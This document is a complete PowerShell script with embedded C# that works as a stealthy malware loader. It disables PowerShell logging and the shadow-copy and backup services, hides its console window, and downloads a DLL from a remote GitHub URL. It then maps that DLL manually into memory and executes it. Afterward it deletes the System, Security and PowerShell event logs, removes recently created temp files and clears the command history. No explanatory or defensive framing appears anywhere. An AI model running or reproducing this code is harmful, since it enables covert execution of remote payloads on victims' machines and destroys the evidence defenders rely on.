Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
$regCommand3 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand4 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null
Invoke-Expression $regCommand3 | Out-Null
Invoke-Expression $regCommand4 | Out-Null

Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

Set-StrictMode -Version Latest

$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference      = 'None'
$WhatIfPreference       = $false
$PSModuleAutoLoadingPreference = 'None'
$MaximumHistoryCount    = 0

*> $null
$Error.Clear()

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))) {
    return
}

Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
        Get-Variable | Where-Object {
            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
        } | Remove-Variable -Force -ErrorAction SilentlyContinue
        Clear-Host
        $Error.Clear()
        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        [GC]::Collect()
        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
    } catch {}
}

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# =============================================================
#  LOG WIPER (from Form1 code, converted to static class)
# =============================================================

$logWiperCode = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;
using System.Diagnostics.Eventing.Reader;

public static class LogWiper
{
    private static readonly string[] VerifyLogs = new[]
    {
        "System",
        "Windows PowerShell",
        "Microsoft-Windows-PowerShell/Operational",
        "Security"
    };

    private static readonly string[] EvtxFiles = new[]
    {
        @"C:\Windows\System32\winevt\Logs\System.evtx",
        @"C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx",
        @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx",
        @"C:\Windows\System32\winevt\Logs\Security.evtx"
    };

    private const string EventLogServiceName = "EventLog";
    private const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

    public static void Wipe()
    {
        bool serviceWasRunning = false;
        try
        {
            if (!IsAdmin()) return;

            serviceWasRunning = IsServiceRunning(EventLogServiceName);

            if (serviceWasRunning)
            {
                try { StopService(EventLogServiceName, 15000); } catch { }
                Thread.Sleep(1000);
            }

            foreach (var path in EvtxFiles)
            {
                try { WipeEvtxFile(path); } catch { }
            }

            if (serviceWasRunning)
            {
                try { StartService(EventLogServiceName, 15000); } catch { }
                Thread.Sleep(2500);
            }

            foreach (var logName in VerifyLogs)
            {
                try
                {
                    var q = new EventLogQuery(logName, PathType.LogName);
                    using (var reader = new EventLogReader(q))
                    {
                        int count = 0;
                        EventRecord rec;
                        while ((rec = reader.ReadEvent()) != null && count < 5)
                        {
                            count++;
                            rec.Dispose();
                        }
                    }
                }
                catch { }
            }
        }
        catch { }
        finally
        {
            try
            {
                if (serviceWasRunning && !IsServiceRunning(EventLogServiceName))
                {
                    try { StartService(EventLogServiceName, 15000); } catch { }
                }
            }
            catch { }
        }
    }

    private static void WipeEvtxFile(string path)
    {
        try
        {
            if (!File.Exists(path)) return;

            File.SetAttributes(path, FileAttributes.Normal);
            File.Delete(path);
            return;
        }
        catch { }

        try
        {
            string renamed = path + ".re4per_" + DateTime.Now.Ticks;
            File.Move(path, renamed);

            try
            {
                File.SetAttributes(renamed, FileAttributes.Normal);
                File.Delete(renamed);
            }
            catch { }
            return;
        }
        catch { }

        try
        {
            if (!MoveFileEx(path, null, MOVEFILE_DELAY_UNTIL_REBOOT))
            {
                TruncateEvtx(path);
            }
        }
        catch
        {
            TruncateEvtx(path);
        }
    }

    private static void TruncateEvtx(string path)
    {
        try
        {
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
            {
                fs.SetLength(0);
                fs.Flush();
            }
        }
        catch { }
    }

    private static bool IsAdmin()
    {
        var id = System.Security.Principal.WindowsIdentity.GetCurrent();
        var p = new System.Security.Principal.WindowsPrincipal(id);
        return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }

    private static bool IsServiceRunning(string name)
    {
        try
        {
            using (var sc = new ServiceController(name))
            {
                return sc.Status == ServiceControllerStatus.Running;
            }
        }
        catch { return false; }
    }

    private static void StopService(string name, int timeoutMs)
    {
        using (var sc = new ServiceController(name))
        {
            if (sc.Status != ServiceControllerStatus.Stopped &&
                sc.Status != ServiceControllerStatus.StopPending)
            {
                sc.Stop();
            }
            sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromMilliseconds(timeoutMs));
        }
    }

    private static void StartService(string name, int timeoutMs)
    {
        using (var sc = new ServiceController(name))
        {
            if (sc.Status != ServiceControllerStatus.Running &&
                sc.Status != ServiceControllerStatus.StartPending)
            {
                sc.Start();
            }
            sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromMilliseconds(timeoutMs));
        }
    }
}
'@

try {
    Add-Type -TypeDefinition $logWiperCode -ErrorAction Stop -ReferencedAssemblies "System.ServiceProcess", "System.Core"
} catch { }

# =============================================================
#  NATIVE MAPPER
# =============================================================

$dllUrl = "https://raw.githubusercontent.com/official-jahid/engine-bios-panel/refs/heads/main/regix-quest.dll"

$loaderCode = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class ManualMapResult
{
    public IntPtr ImageBase;
    public uint ImageSize;
    public IntPtr DllMainAddr;
    public IntPtr CrtInitAddr;
    public long Delta;
    public bool Is64Bit;
}

public static class NativeLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetModuleHandleA(string n);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string n);

    [DllImport("kernel32.dll")]
    static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READONLY = 0x02;
    const uint PAGE_EXECUTE = 0x10;

    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64() + o)); }
    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64() + o)); }
    static ulong  RU64(IntPtr p, long o)
    {
        long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64() + o));
        long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64() + o + 4));
        return (ulong)((hi << 32) | lo);
    }
    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64() + o), (long)v); }
    static void WU32(IntPtr p, long o, uint v)  { Marshal.WriteInt32((IntPtr)(p.ToInt64() + o), (int)v); }

    static string RAscii(IntPtr p, long o)
    {
        var sb = new StringBuilder();
        for (int i = 0; i < 260; i++)
        {
            byte b = Marshal.ReadByte((IntPtr)(p.ToInt64() + o + i));
            if (b == 0) break;
            sb.Append((char)b);
        }
        return sb.ToString();
    }

    static uint SProt(uint ch)
    {
        bool x = (ch & 0x20000000) != 0;
        bool w = (ch & 0x80000000) != 0;
        bool r = (ch & 0x40000000) != 0;
        if (x && w) return PAGE_EXECUTE_READWRITE;
        if (x && r) return PAGE_EXECUTE_READ;
        if (x)      return PAGE_EXECUTE;
        if (w)      return PAGE_READWRITE;
        if (r)      return PAGE_READONLY;
        return PAGE_READONLY;
    }

    struct Sec { public uint VS, VA, SRD, PRD, Ch; }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);

    public static ManualMapResult Map(byte[] dll, bool callEntry)
    {
        var res = new ManualMapResult();
        if (dll == null || dll.Length < 0x100) throw new Exception("Payload too small");
        if (U16(dll, 0) != 0x5A4D) throw new Exception("Invalid MZ");

        int lfa = BitConverter.ToInt32(dll, 0x3C);
        if (U32(dll, lfa) != 0x4550u) throw new Exception("Invalid PE");

        int co = lfa + 4;
        ushort ns = U16(dll, co + 2);
        ushort ohs = U16(dll, co + 16);
        int oo = co + 20;

        bool is64 = (U16(dll, oo) == 0x020B);
        res.Is64Bit = is64;

        bool hostIs64 = IntPtr.Size == 8;
        if (is64 != hostIs64) throw new Exception("Architecture mismatch");

        uint ep  = U32(dll, oo + 16);
        uint soi = U32(dll, oo + 56);
        uint soh = U32(dll, oo + 60);
        ulong ib = is64 ? U64(dll, oo + 24) : U32(dll, oo + 28);
        res.ImageSize = soi;

        int dd = is64 ? oo + 112 : oo + 96;
        uint irva = U32(dll, dd + 8);
        uint rrva = U32(dll, dd + 40);
        uint rsz  = U32(dll, dd + 44);
        uint eraw = U32(dll, dd + 0);

        int st = oo + ohs;
        var secs = new Sec[ns];
        for (int i = 0; i < ns; i++)
        {
            int b = st + i * 40;
            secs[i] = new Sec
            {
                VS  = U32(dll, b + 8),
                VA  = U32(dll, b + 12),
                SRD = U32(dll, b + 16),
                PRD = U32(dll, b + 20),
                Ch  = U32(dll, b + 36)
            };
        }

        IntPtr img = VirtualAlloc(IntPtr.Zero, (UIntPtr)soi, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (img == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        res.ImageBase = img;

        long ab = img.ToInt64();
        long delta = ab - (long)ib;
        res.Delta = delta;

        Marshal.Copy(dll, 0, img, (int)soh);

        foreach (var s in secs)
        {
            if (s.SRD == 0) continue;
            uint cs = s.VS == 0 ? s.SRD : Math.Min(s.SRD, s.VS);
            if (s.PRD + cs > (uint)dll.Length)
            {
                cs = (uint)dll.Length - s.PRD;
                if (cs == 0) continue;
            }
            Marshal.Copy(dll, (int)s.PRD, (IntPtr)(ab + s.VA), (int)cs);
        }

        if (rrva != 0 && delta != 0)
        {
            uint ro = rrva;
            uint re = rrva + rsz;
            while (ro < re)
            {
                uint pg = RU32(img, ro);
                uint bs = RU32(img, ro + 4);
                if (bs == 0) break;
                int ne = (int)(bs - 8) / 2;
                for (int i = 0; i < ne; i++)
                {
                    ushort e = RU16(img, ro + 8 + i * 2);
                    int ty = (e >> 12) & 0xF;
                    int of = e & 0xFFF;
                    if (ty == 0) continue;
                    long tr = pg + of;
                    if (ty == 10)
                    {
                        ulong c = RU64(img, tr);
                        WU64(img, tr, (ulong)((long)c + delta));
                    }
                    else if (ty == 3)
                    {
                        uint c = RU32(img, tr);
                        WU32(img, tr, (uint)((long)c + delta));
                    }
                }
                ro += bs;
            }
        }

        if (irva != 0)
        {
            int ie = 0;
            while (true)
            {
                long eo = irva + ie * 20;
                uint nr  = RU32(img, eo + 12);
                uint ir  = RU32(img, eo + 16);
                uint inr = RU32(img, eo + 0);
                if (nr == 0) break;

                string dn = RAscii(img, nr);
                IntPtr hd = GetModuleHandleA(dn);
                if (hd == IntPtr.Zero) hd = LoadLibraryA(dn);
                if (hd == IntPtr.Zero) { ie++; continue; }

                long to = 0;
                uint tb = inr != 0 ? inr : ir;
                int ts = is64 ? 8 : 4;

                while (true)
                {
                    long te = tb + to;
                    long tv = is64 ? (long)RU64(img, te) : (long)RU32(img, te);
                    if (tv == 0) break;

                    long of = is64 ? unchecked((long)0x8000000000000000L) : (long)0x80000000;
                    IntPtr fa = IntPtr.Zero;

                    if ((tv & of) != 0)
                        fa = GetProcAddress(hd, (IntPtr)(int)(tv & 0xFFFF));
                    else
                        fa = GetProcAddress(hd, RAscii(img, tv + 2));

                    if (fa != IntPtr.Zero)
                    {
                        IntPtr ia = (IntPtr)(ab + ir + to);
                        if (is64) Marshal.WriteInt64(ia, fa.ToInt64());
                        else      Marshal.WriteInt32(ia, fa.ToInt32());
                    }
                    to += ts;
                }
                ie++;
            }
        }

        res.CrtInitAddr = IntPtr.Zero;
        if (eraw != 0)
        {
            uint eatRva = RU32(img, eraw + 0x1C);
            uint enpRva = RU32(img, eraw + 0x20);
            uint eoiRva = RU32(img, eraw + 0x24);
            uint numN   = RU32(img, eraw + 0x18);

            for (uint i = 0; i < numN; i++)
            {
                uint nameRva = RU32(img, enpRva + i * 4);
                string fn = RAscii(img, nameRva);
                if (fn == "_CRT_INIT" || fn == "CRT_INIT")
                {
                    ushort ord = RU16(img, eoiRva + i * 2);
                    uint fnRva = RU32(img, eatRva + ord * 4);
                    if (fnRva != 0)
                    {
                        res.CrtInitAddr = (IntPtr)(ab + fnRva);
                        break;
                    }
                }
            }
        }

        foreach (var s in secs)
        {
            uint sz = Math.Max(s.VS, s.SRD);
            if (sz == 0) continue;
            uint op;
            VirtualProtect((IntPtr)(ab + s.VA), (UIntPtr)sz, SProt(s.Ch), out op);
        }

        FlushInstructionCache(GetCurrentProcess(), img, (UIntPtr)soi);

        res.DllMainAddr = IntPtr.Zero;
        if (callEntry && ep != 0)
        {
            res.DllMainAddr = (IntPtr)(ab + ep);

            if (res.CrtInitAddr != IntPtr.Zero)
            {
                try
                {
                    var crtFn = (DllMainFn)Marshal.GetDelegateForFunctionPointer(res.CrtInitAddr, typeof(DllMainFn));
                    crtFn(img, 1, IntPtr.Zero);
                }
                catch { }
            }

            try
            {
                var fn = (DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr, typeof(DllMainFn));
                bool ok = fn(img, 1, IntPtr.Zero);
            }
            catch { }
        }

        return res;
    }

    public static bool Free(IntPtr b)
    {
        return VirtualFree(b, UIntPtr.Zero, MEM_RELEASE);
    }
}
'@

try {
    Add-Type -TypeDefinition $loaderCode -ErrorAction Stop
} catch {
    Invoke-Finalize
    return
}

$bytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
[NativeLoader]::Map($bytes, $true)

# =============================================================
#  WIPE EVENT LOGS — LAST STEP (after map)
# =============================================================

try { [LogWiper]::Wipe() } catch { }

# =============================================================
#  CLEANUP
# =============================================================

Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

$bytes = $null
$loaderCode = $null
$logWiperCode = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()

$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
}

Invoke-Finalize
